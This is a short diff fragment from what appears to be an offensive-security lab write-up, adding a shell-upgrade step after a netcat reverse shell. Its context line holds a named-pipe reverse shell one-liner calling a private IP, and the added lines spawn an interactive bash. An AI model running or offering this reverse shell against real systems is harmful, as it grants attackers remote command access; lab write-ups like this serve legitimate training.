@@ -246,3 +246,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.194 80 >/tmp/f
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/0dac6902-0627-447a-8f9e-58f1299a2ee5)
 
+Upgrade Shell
+```
+$ /usr/bin/script -qc /bin/bash /dev/null
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/823c3dfb-7886-4702-8bf6-853cf73ac810)
+
